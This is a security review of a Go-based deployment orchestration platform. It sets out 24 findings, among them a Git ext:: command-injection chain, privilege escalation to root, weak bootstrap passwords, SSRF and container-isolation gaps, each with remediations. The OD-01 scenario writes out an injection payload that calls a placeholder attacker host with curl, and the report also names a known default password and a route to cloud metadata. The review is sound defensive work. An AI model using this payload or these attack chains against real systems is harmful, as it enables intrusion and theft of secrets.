Security Review — OpenDeploy (opsagent)

Deployment & cluster orchestration platform · Go backend + VanJS SPA · passkey auth · encrypted secrets · container/systemd engine
Date: 2 July 2026 Scope: full repository (258 files; 141 Go, 39 JS) Branch: main (clean tree) Method: manual source review, multi-domain Findings: 24 (2 Critical · 5 High · 7 Medium · 10 Low)

Executive summary

OpenDeploy makes strong foundational choices — XChaCha20-Poly1305 for secrets, Ed25519 mTLS on a dedicated cluster port, argon2id password hashing, TLS 1.3, WebAuthn passkeys, and parameterized SQL throughout. The primitives are modern and, for the most part, correctly applied. The serious issues are not broken cryptography; they are trust-boundary and privilege problems: a reachable command-execution sink, a service account that is root in all but name, a weak bootstrap credential on an unauthenticated endpoint, and cluster/worker interfaces that hand out more than the caller should be able to see.

The single most important chain

Three findings compose into unauthenticated remote code execution, then root, on a default primary install that has not yet been hardened. This is the risk to fix first.

OD-03 (weak bootstrap) → OD-01 (git ext:: RCE) → OD-02 (service→root). Each step is verified in source below.

Top risks at a glance

  • OD-01 · Critical — Unvalidated repo URLs reach git ls-remote; Git's ext:: transport turns that into command execution.
  • OD-02 · Critical — The opendeploy service is root-equivalent: ambient CAP_SETUID/CAP_SYS_ADMIN, NoNewPrivileges off, a service-writable executable, and passwordless sudo restart.
  • OD-03 · High — Weak, unauthenticated, un-rate-limited master-password bootstrap that auto-provisions admin accounts.
  • OD-04 · High — Any single enrolled worker can read every secret, config, and the GitHub token.
  • OD-05 · High — Worker enrollment disables TLS verification, so an on-path attacker owns a joining node.
  • OD-06/07 · High — Containers for untrusted images run with host networking, no seccomp, root by default, and arbitrary host bind mounts.

Trust model & how severities are calibrated

Per docs/engineering/auth.md and confirmed in code, OpenDeploy is a single-admin tool. There is one privileged scope (default) and one bootstrap scope (passkey:create); every authenticated caller is the full administrator. "Spaces" are an organizational label, not a security boundary, and there is no per-user or per-space authorization.

This shapes severity in two directions, and I have applied it honestly throughout:

  • It lowers some issues. Cross-space "IDOR"-style access (acting on another space's secret/asset by id) is by design today — it is not scored as a vulnerability, only flagged as a latent risk if a lower-trust role is ever introduced. The admin can already run arbitrary Nix builds (= arbitrary host code), so "malicious config" is not, by itself, privilege escalation.
  • It does not excuse the serious findings. The issues scored Critical/High survive the single-admin model because they each cross a boundary the model still relies on: they grant unauthenticated access (OD-01 via OD-03), escalate the service/admin to root (OD-02), let a compromised worker or malicious container image exceed its intended reach (OD-04, OD-06/07), or let a network attacker take over a node (OD-05). "Encrypted at rest" and "runs as a non-root user" are claims the product makes; these findings show where those claims do not hold.

Critical findings

OD-01 Remote code execution via Git ext:: transport in repo-URL handling

CRITICAL CWE-78 OS Command Injection CWE-88 Argument Injection CWE-20 Improper Input Validation
Location
backend/engine/preparer/gitmanager.go:54–86 …:106, 133 (ls-remote sink) backend/handler/repo_validate.go:42–53 backend/handler/deployments.go:188–228
What & why

User-supplied repository URLs flow to git ls-remote with essentially no validation. resolveCloneURL rejects only NUL/CR/LF and, for any string containing ://, returns it verbatim when it does not parse as a clean http(s) URL:

// gitmanager.go — resolveCloneURL
if strings.Contains(repoURL, "://") {
    u, err := url.Parse(repoURL)
    if err == nil && (u.Scheme == "https" || u.Scheme == "http") && !strings.HasSuffix(u.Path, ".git") {
        u.Path += ".git"; repoURL = u.String()
    }
    return injectGithubToken(repoURL, githubToken)  // ext:: string returned unchanged
}
// …later: exec.CommandContext(ctx, "git", "ls-remote", "--heads", cloneURL)

Git supports the ext:: remote helper, which executes a command. Because OpenDeploy calls git directly (top-level, not a submodule), Git's default protocol.ext.allow=user policy permits it, and nothing sets GIT_ALLOW_PROTOCOL (verified — no such guard anywhere in the tree). The Go call passes arguments as a slice (no shell), but the command execution happens inside Git's own transport layer, so that does not help. There is also no -- separator before the URL, permitting flag injection for URLs beginning with -.

Attacker-controlled string survives untouched from the API to Git's command-executing transport.
Attack scenario

An authenticated default caller (or an unauthenticated attacker who first walks the OD-03 chain) sends:

POST /v1/repo/validate
{ "nixDockerBuild": { "repoUrl": "ext::sh -c curl% http://attacker/$(id)", "checkRepo": true } }

The string contains ://, so it is returned verbatim and handed to git ls-remote --heads. Git's ext:: transport runs sh -c, giving code execution as the OpenDeploy process — outside any container sandbox. The same payload stored as a deployment's repo detonates later via PostV1DeploymentVersions / at prepare time.

Remediation
  • Validate repoUrl against a strict allowlist before it reaches Git: require scheme ∈ {https, ssh} or an owner/repo shorthand; reject anything containing ::, spaces, or a leading -.
  • Set GIT_ALLOW_PROTOCOL=https:ssh (and GIT_PROTOCOL_FROM_USER=0) in cmd.Env for every git invocation — this alone kills the ext::/file:: vector.
  • Pass -- before the URL argument to prevent flag injection.

OD-02 Service account is root-equivalent (ambient caps + writable ExecStart + sudo restart)

CRITICAL CWE-250 Execution with Unnecessary Privileges CWE-732 Incorrect Permission Assignment CWE-269 Improper Privilege Management
Location
internal/installer/assets/opendeploy.service:35 (+26–34) internal/installer/assets/sudoers:4,7,10 internal/installer/install.go:294,305,311,321
What & why

The unit is nominally unprivileged (User=opendeploy) but the security separation is cosmetic. Three facts combine:

// opendeploy.service
User=opendeploy
# NoNewPrivileges is intentionally not set …
AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_SETUID CAP_SETGID CAP_KILL CAP_CHOWN CAP_SYS_ADMIN CAP_DAC_OVERRIDE
  1. Ambient CAP_SETUID + CAP_SYS_ADMIN. Ambient caps sit in the process's effective set and are inherited across execve into every child (including preparers running arbitrary nix/git). CAP_SETUID alone lets the process call setuid(0).
  2. The executable is writable by the service user. The installer creates /var/lib/opendeploy/bin and the release binary 0755 owned by opendeploy (install.go:311,321).
  3. Passwordless restart. Sudoers grants NOPASSWD: /usr/bin/systemctl restart opendeploy.service (and the containerd unit).

The sudoers rules themselves are exact-match with no wildcards — well written in isolation. The danger is that their restart targets are attacker-writable.

Two independent escalation paths. Path B reaches a root process even if the ambient caps on the main unit are fixed.
Attack scenario

Anyone who gains code execution as the opendeploy uid — via OD-01, a malicious build artifact, or a leaked credential — overwrites the service binary, runs sudo systemctl restart opendeploy.service, and the replacement starts with ambient CAP_SETUID → setuid(0) → persistent root. Path B works via standard Unix parent-directory semantics: /var/lib/opendeploy is 0750 and owned by opendeploy, so its runtime/ child (root-owned files) can be renamed away and replaced, then started as root by the containerd unit.

Remediation
  • Own the ExecStart targets as root:root and make them non-writable by the service; stage self-updates through a small, audited privileged helper.
  • Remove CAP_SETUID/CAP_SETGID/CAP_SYS_ADMIN from AmbientCapabilities; keep only what the main process needs (likely just CAP_NET_BIND_SERVICE) and set NoNewPrivileges=yes. Drop caps + change uid before spawning preparer/build children.
  • Set the sticky bit (or restructure ownership) so service-owned dirs cannot rename root-owned children; prefer a systemd-side restart trigger over a sudo restart primitive.

High findings

OD-03 Weak, unauthenticated, un-rate-limited master-password bootstrap

HIGH CWE-521 Weak Password Requirements CWE-307 Improper Restriction of Auth Attempts CWE-306 Missing Authentication
Location
backend/handler/auth.go:34–64 (NO_AUTH) internal/installer/install.go:394–398 internal/installer/assets/env.template
What & why

The bootstrap password generated at install is "opendeploy" + 4 digits — a keyspace of 10,000:

// install.go
n, _ := rand.Int(rand.Reader, big.NewInt(10000))
password := fmt.Sprintf("opendeploy%04d", n.Int64())

The template also ships a fixed argon2id hash for the publicly-documented password opendeploy-setup. POST /v1/auth/master is NO_AUTH, has no rate limiting or lockout (verified: the web mux has no throttling middleware), and — critically — auto-creates a user for any unknown username and returns a passkey:create token:

// auth.go — PostV1AuthMaster
if errors.Is(err, sqlite.ErrNotFound) {
    id := int32(h.Store.UserCount()) + 1
    h.Store.WriteUser(user)   // anyone with the password creates a new admin identity
}
token, _ := h.jwtAuth.GenerateTokenWith(user.ID, []string{"passkey:create"}, 10*time.Minute)

Nothing disables master login once passkeys exist. So the password is a permanent, unthrottled path to creating fresh admin accounts — not just a one-time bootstrap.

Attack scenario

An attacker who can reach the primary brute-forces the 10⁴ setup password in seconds (or uses the known opendeploy-setup default), mints a passkey:create token, registers their own passkey, and receives a 7-day default session — full control of the deployment control plane. This is the entry point for the unauthenticated OD-01 → OD-02 chain.

Remediation
  • Generate a high-entropy setup secret (≥128 bits, base32) and never ship a hash of a known password.
  • Disable master-password login once the first passkey is registered (or gate it behind a one-time setup window); do not auto-create additional users on master login.
  • Add rate limiting / exponential backoff / lockout to /v1/auth/master and /v1/auth/master/password/verify.

OD-04 Any enrolled worker can read the entire secret store, configs, and the GitHub token

HIGH CWE-862 Missing Authorization CWE-639 Authorization Bypass Through User-Controlled Key
Location
backend/primary/primary.go:86–92 (github creds) …:94–119 (assets) …:133–149 (secrets) …:151–164 (configs)
What & why

Cluster endpoints authenticate the worker by mTLS CN but never check that the requesting machine is actually assigned the resource it asks for. GetV1ClusterSecrets resolves whatever id list arrives:

// primary.go
func (p *Primary) GetV1ClusterSecrets(authCtx apigen.Context, req *apigen.ClusterSecretsRequest) (...) {
    values, err := p.secrets.ResolveMany(req.Ids)   // no check against machineFromContext(authCtx)
    ...
}

The verified CN (machineFromContext) is available but unused here. GetV1ClusterAsset streams any asset by numeric id, and GetV1ClusterGithubCredentials returns the org token to any peer.

A worker that should see only its own secrets can enumerate and exfiltrate every secret in the cluster.
Attack scenario

A single compromised worker (or a stolen node.key, or a malicious node an admin accepted) calls GET /v1/cluster/secrets with Ids=[1..N] and exfiltrates the whole secret store plus the GitHub token — defeating the documented property that "secrets never reach a secondary beyond what it runs."

Remediation

Scope every cluster read to the requesting machine: derive the allowed secret/config/asset id set from the deployments actually scheduled on machineFromContext(authCtx) and reject ids outside it. Gate the GitHub token to workers that genuinely need it.

OD-05 Enrollment disables TLS verification → worker takeover via MITM

HIGH CWE-295 Improper Certificate Validation CWE-300 Channel Accessible by Non-Endpoint (MITM)
Location
backend/secondary/enrollment.go:123–128
What & why

A joining worker's first contact with the primary performs no server-identity verification:

// secondary/enrollment.go
return &http.Client{Transport: &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}}

The CSR design keeps the worker's private key off the wire (good — passive capture is prevented), but active MITM is wide open. The code comment concedes it: "Fingerprint pinning can replace this bootstrap skip later."

Worker trusts whatever answers on the enrollment port; the attacker becomes the worker's cluster root of trust.
Attack scenario

An attacker on the network path intercepts enrollment, receives the worker's CSR, and returns an EnrollmentAccepted carrying an attacker CA and attacker-signed node cert. The worker writes them as its trust root, then trusts the attacker's "cluster" — receiving and executing deployment specs the attacker pushes.

Remediation

Pin the primary's expected certificate/SPKI fingerprint out-of-band (embed it in the enrollment address or a join token) and verify against it instead of InsecureSkipVerify; alternatively use a pre-shared enrollment token with an HMAC over the primary cert.

OD-06 Weak container isolation for untrusted images

HIGH CWE-250 Unnecessary Privileges CWE-16 Configuration
Location
backend/engine/ctrd/client_linux.go:144–174 backend/engine/runner/container.go:151–160,749–753
What & why

Deployed images are frequently untrusted (upstream registry images, artifacts built from external repos), yet the OCI sandbox that should contain them is substantially weakened:

// client_linux.go — spec options
oci.WithImageConfig(img),
oci.WithHostNamespace(specs.NetworkNamespace),  // host networking, unconditional
oci.WithHostHostsFile, oci.WithHostResolvconf,
oci.WithEnv(spec.Env),
// user = image default (often root); mounts default to rw

Verified absent across the whole tree: no seccomp profile, no NoNewPrivileges, no AppArmor, no user namespace / UID remap. With no userns, container UID 0 = host UID 0. It is at least not --privileged and adds no extra capabilities, so this is missing hardening, not an over-privileged container — but for untrusted images that is still a wide escape/attack surface.

Attack scenario

A malicious image running as root in the host network namespace reaches any loopback-bound service (the OpenDeploy API on :8080, local databases), can craft/sniff L2/L3 traffic, and — with no seccomp / no-new-privileges — has the full kernel syscall surface for escape attempts.

Remediation

Apply a default seccomp profile and NoNewPrivileges; drop host networking (bridge + explicit port mapping) or make it strictly opt-in; default to a non-root user or enable a user namespace so container-root ≠ host-root.

OD-07 Arbitrary host-path bind mounts into containers

HIGH CWE-22 Path Traversal / Improper Path Limitation CWE-732 Incorrect Permission Assignment
Location
backend/handler/deployments.go:797–820 backend/engine/ctrd/client_linux.go:130–141
What & why

Mount validation only requires a clean absolute host path that is not exactly /; there is no allowlist and mounts are read-write by default:

// deployments.go — validateContainerMounts
if filepath.Clean(host) != host || host == "/" {  // only "/" itself is blocked
    return invalidConfigErrf("host path must be a clean absolute path")
}

So /etc, /root, the container runtime socket, and /var/lib/opendeploy (the encrypted secrets DB and the plaintext machine.key that decrypts it) are all mountable, read-write, into a container that runs as root (OD-06).

Mounting the data dir hands a container both the ciphertext and the key that decrypts it — bypassing "encrypted at rest".
Attack scenario

A deployment mounts /var/lib/opendeploy (or the containerd socket, or /root/.ssh) read-write; container-root reads machine.key + primary.db to decrypt every secret, or writes host files as root. Under the single-admin model the config author is trusted, but this means the container is not a boundary against a malicious image, and "encrypted at rest" gives no protection once the data dir is mountable.

Remediation

Restrict host mounts to an operator-configured allowlist (or forbid them and require asset mounts). At minimum deny the data dir, runtime sockets, /etc, and home directories, and default mounts to read-only.

Medium findings

OD-08 SSRF via registry host and auth-realm / Link redirect following

MEDIUMCWE-918 Server-Side Request Forgery
Location
backend/handler/repo_validate.go:181–193 backend/handler/deployments.go:220–228 backend/engine/versionprovider/containerimage.go:164–214
What & why

The registry host is taken from the user-supplied image string and used to build requests with http.DefaultClient — no allowlist, no internal-range blocking. Worse, registryBearerToken follows the realm from a WWW-Authenticate header to an arbitrary URL, and nextRegistryPageURL follows Link headers — both let a hostile "registry" redirect the fetch off the /v2/ path to, e.g., http://169.254.169.254/….

Attack scenario

POST /v1/repo/validate with an image whose registry host is an internal address probes internal services; a malicious registry redirects the token/pagination fetch to cloud metadata. Status and first-tag JSON are reflected back, giving an oracle.

Remediation

Resolve the registry host and reject RFC1918/loopback/link-local/ULA (resolve-then-pin against DNS rebinding); restrict realm and Link follow-targets to the same registry host, or re-run the SSRF guard on every hop.

OD-09 No signature verification of downloaded binaries/images; curl|bash from main

MEDIUMCWE-494 Download of Code Without Integrity CheckCWE-345 Insufficient Verification of Authenticity
Location
backend/engine/preparer/ghrelease.go:365–429 backend/engine/ctrd/client_linux.go:60–71 scripts/install_primary.sh · README.md
What & why

Release assets are downloaded, chmod 0755, and run (via symlink + systemd restart) with no SHA/signature verification. Container images are pulled by mutable tag with no digest pinning enforced. The install one-liner pulls the script from the main branch (a moving target) and verifies the binary against a sha256sums.txt fetched from the same release — so the checksum detects transit corruption only, not a tampered release or compromised account. The verified binary then runs as root.

Good contrast: the bundled containerd/runc deps are pinned with per-arch SHA-256 baked into the binary (installer/config.go). Apply the same discipline to the agent binary and images.

Remediation

Sign releases (minisign/cosign) and verify the signature against a key pinned in the installer/binary; pin the install script to a tagged commit, not main; pin container images by digest and verify the resolved digest.

OD-10 SQLite DB (master hash + encrypted secrets) is group-readable

MEDIUMCWE-732 Incorrect Permission Assignment
Location
backend/storage/sqlite/init.go:31 opendeploy.service (no UMask)
What & why

sql.Open creates primary.db (+ -wal/ -shm) with no explicit mode and no follow-up chmod; under systemd's default UMask=0022 the file lands at 0644 opendeploy:opendeploy. The parent dir is 0750, so "other" is blocked, but any member of the opendeploy group can read the DB — inconsistent with the restore path, machine key, and recovery file, which are all deliberately 0600.

Attack scenario

A local principal in the opendeploy group reads the argon2id master hash (offline cracking) and all secret ciphertext + wrapped SMK from primary.db-wal, with no opendeploy privileges.

Remediation

After open, os.Chmod(0600) the DB, -wal, and -shm (mirroring restore.go:102), and/or set UMask=0077 in the unit.

OD-11 Unauthenticated enrollment: resource-exhaustion DoS, panic-on-error, spoofable client IP

MEDIUMCWE-770 Allocation Without LimitsCWE-248 Uncaught ExceptionCWE-290 Spoofing
Location
backend/handler/enrollment.go:39–87 …:57 (MustUpsert…) …:192–204 (remoteIP / X-Forwarded-For)
What & why

Any client reaching :9444 (no client cert required) opens enrollment streams with an attacker-chosen machine id. Each call performs a Must… DB write that panics/crashes the primary on any error, and holds a blocked goroutine + in-memory session until disconnect, with no cap on distinct ids or concurrent sessions. remoteIP blindly trusts X-Forwarded-For, so the IP an admin sees before accepting is spoofable.

Remediation

Cap concurrent/total pending enrollments (per source + global) and rate-limit the listener; don't use panic-on-error writes on an unauthenticated path; ignore X-Forwarded-For unless a trusted proxy is configured — record RemoteAddr.

OD-12 Restore leaks S3 key + secrets recovery code via process argv

MEDIUMCWE-214 Invocation of Process with Sensitive Args
Location
internal/installer/installer.go:97–103 internal/installer/restore.go:81–83,106 scripts/restore_primary.sh:112
What & why

Restore takes the S3 secret access key and the secrets recovery code (which unlocks the entire secrets store) as command-line flags. Argv is world-readable via ps / /proc/<pid>/cmdline for the process lifetime, and lands in shell history.

Remediation

Accept these via environment variables sourced from a 0600 file, stdin, or a prompt — never argv.

OD-13 7-day JWT in localStorage + no Content-Security-Policy

MEDIUMCWE-522 Insufficiently Protected CredentialsCWE-693 Protection Mechanism Failure
Location
frontend/src/state/login.js:117 (+62,79–88) frontend/src/capi/index.js:5–8 frontend/src/index.html (no CSP)
What & why

The 7-day session JWT — which grants full control including secret reveal — is persisted in localStorage under authSession (plus a legacy authToken path), readable by any script on the origin. The SPA ships with no CSP, so there is no second line of defence if any injection is ever introduced. No live XSS exists today (VanJS renders attacker data as text — verified), but the app also reveals live secret values into the DOM on demand, so any future script-exec reads both the token and revealed secrets.

Remediation

Move the session to an httpOnly; Secure; SameSite=Strict cookie (or in-memory with silent refresh); have the backend send a strict CSP (default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none') and X-Frame-Options: DENY; remove the legacy authToken path.

OD-14 Config export bypasses redaction applied on other read paths

MEDIUMCWE-200 Information Exposure
Location
backend/handler/export.go:20 backend/handler/redact.go:14–23
What & why

PostV1GenerateExportedConfig serializes full DeploymentConfig objects via ListActiveDeploymentConfigs() without calling redactDeploymentConfig, which the live state stream and history do apply. So systemd-runner details deemed sensitive enough to strip elsewhere are present verbatim in the export blob. (Secret values are not leaked — export uses metadata/references only.)

What was checked and found sound

A credible review states what holds, not only what breaks. These were examined and are correctly done:

  • No SQL injection. All queries are parameterized (? placeholders); the one dynamic ORDER BY is a static literal. queries.sql.go is sqlc-generated.
  • Secrets AEAD is correct. XChaCha20-Poly1305 with 24-byte random nonces from crypto/rand; AAD binds each ciphertext to its name/class/slot so records can't be swapped. crypto/rand is used everywhere (no math/rand in the backend).
  • Key hierarchy. SMK sealed under argon2id-derived KEKs (t=3, m=64 MiB, p=4), distinct AAD domains for value-encryption vs key-wrapping, unique per-slot salts. Recovery codes are 256-bit, never stored (only the wrapped SMK).
  • Password hashing. argon2id (m=64 MiB, t=3, p=1, 16-byte salt, 32-byte key), verified with subtle.ConstantTimeCompare after a length check.
  • TLS. MinVersion: TLS 1.3 on all listeners; cluster listener enforces RequireAndVerifyClientCert. Ed25519 CA/leaf keys; EKU separation (worker=ClientAuth, node=ServerAuth); CSR proof-of-possession checked and subject overridden with the operator-chosen name.
  • JWT core. RS256/RSA-2048, kid-based key lookup, private key memory-only (never persisted), exp enforced; golang-jwt v4.5.2 (patched for CVE-2024-51744).
  • Info-disclosure hygiene. ApiErr.InternalErr is never wire-encoded; non-ApiErr errors collapse to a generic 500. Secret values appear only on explicit reveal endpoints, never in lists/state-stream/config.
  • No shell in the engine. All exec uses fixed program names with separate args; git ref/branch/path args are cleaned (leading--/NUL/CRLF rejected); flake/tree paths block .. and absolute paths. (OD-01 is the exception — via git's own transport, not a shell.)
  • Frontend XSS. Build/log output, deployment names, repo URLs, and errors are rendered as VanJS text nodes (auto-escaped). No innerHTML injection, eval, document.write, or open redirects; no hardcoded secrets or committed .env.
  • Request size limits exist on all listeners; asset object keys derive from numeric IDs (no path traversal); upload/rename names reject / \ .. \x00.
  • sudoers rules are exact-match, no wildcards, installed 0440 and validated with visudo -cf before an atomic rename; containerd/runc deps are version-pinned with per-arch SHA-256.
